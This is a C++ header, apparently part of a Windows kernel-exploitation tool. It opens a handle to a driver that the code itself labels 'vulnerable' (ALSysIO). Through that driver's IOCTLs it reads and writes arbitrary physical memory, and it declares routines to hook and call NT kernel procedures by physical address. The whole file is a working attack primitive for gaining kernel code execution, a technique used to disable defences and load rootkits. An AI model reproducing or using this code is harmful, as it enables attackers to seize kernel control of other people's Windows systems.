#pragma once

#include "..\util.hpp"

namespace driver_util {

    namespace ctl_codes {
        constexpr auto read_ctl = 0x9C402618;
        constexpr auto write_ctl = 0x9C40261C;
    }

#pragma pack(push, 1)
    template< std::size_t read_sz >
    struct read_data {
        std::uint64_t physical_addr;
        std::uint32_t sz;
        std::uint8_t buf[read_sz];
    };

    template< std::size_t buf_sz >
    struct write_data {
        std::uint64_t physical_addr;
        std::uint32_t sz;
        std::uint8_t buf[buf_sz];
    };


#pragma pack(pop)
    struct driver {

        HANDLE drv_handle{};
        HMODULE kernel_handle{};
        void* original_instr{};
        std::size_t hk_addr{};

        driver() noexcept {
            util::log("%s", "Opening handle to vulnerable driver...");
            do {
                this->drv_handle = CreateFileA("\\\\.\\ALSysIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
                std::this_thread::sleep_for(std::chrono::seconds(1));
            } while (this->drv_handle == INVALID_HANDLE_VALUE);
            util::log("%s %p", "Driver handle:", this->drv_handle);

            util::log("Opening handle to kernel...");

            this->kernel_handle = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
            if (!this->kernel_handle)
                util::log("Failed to open handle to kernel. Cannot proceed.");
        }

        ~driver() noexcept {
            if (drv_handle)
                CloseHandle(drv_handle);
        }

        template< std::size_t read_sz >
        [[nodiscard]] std::uint8_t* read_phys_mem(std::size_t physical_addr) const {
            constexpr auto PHYSMEMSTRUCTSZ = sizeof(std::uint64_t) + sizeof(std::uint32_t);

            read_data<read_sz> rd_data{ physical_addr, read_sz };

            unsigned long bytes_returned{};
            if (const auto status = DeviceIoControl(drv_handle, ctl_codes::read_ctl, &rd_data, read_sz, &rd_data, read_sz, &bytes_returned, nullptr); !status) {
                if (const auto err = GetLastError(); err != 998)
                    util::log("Failed to read physical memory via IOCTL: %d", err);
                return nullptr;
            }

            const auto buf = new std::uint8_t[read_sz];
            std::memmove(buf, &rd_data, read_sz);
            return buf;
        }

        template< std::size_t buf_sz >
        [[nodiscard]] bool write_phys_mem(std::size_t physical_addr, void* buf) const {
            write_data<buf_sz> wr_data{ physical_addr, buf_sz };
            std::memcpy(&wr_data.buf, buf, buf_sz);

            unsigned long bytes_returned{};
            const auto status = DeviceIoControl(drv_handle, ctl_codes::write_ctl, &wr_data, buf_sz, nullptr, buf_sz, &bytes_returned, nullptr);
            if (!status)
                util::log("Failed to write physical memory via IOCTL. Error code:  %d", GetLastError());
            return status;
        }

        template<typename ret_t, typename T, typename... args_t>
        std::size_t call_ntproc(std::pair<std::size_t, const char*> dummy_proc, const char* target_nt_proc, args_t&&... args) {
            const auto hk_res = hk_pa(dummy_proc.first, target_nt_proc);
            if (!hk_res)
                return util::log("Failed to hook NT procedure. Can't proceed"), 0;

            const auto ntdll = GetModuleHandleA("ntdll.dll");
            if (!ntdll)
                return util::log("Failed to retrieve handle to ntdll. Can't proceed "), 0;

            const auto nt_proc = GetProcAddress(ntdll, dummy_proc.second);
            if (!nt_proc)
                return util::log("Failed to get %s address", dummy_proc.second), 0;

            util::log("Calling %s", dummy_proc.second);

            const auto call = reinterpret_cast<ret_t(__stdcall*)(args_t...)>(nt_proc);
            //const auto pa = call(std::forward< args_t >(args)...);
            std::this_thread::sleep_for(std::chrono::seconds(3));
            const auto unhk_res = unhk_pa();

            return 0;
        }

        [[nodiscard]] bool hk_pa(std::size_t, const char*);
        [[nodiscard]] bool unhk_pa() const;
        [[nodiscard]] std::size_t get_ntproc_pa(const char*);
    };

    struct phys_mem_range {
        std::size_t start;
        std::uint64_t length;
    };

    [[nodiscard]] std::optional<std::vector<phys_mem_range>> get_physmem_ranges();

}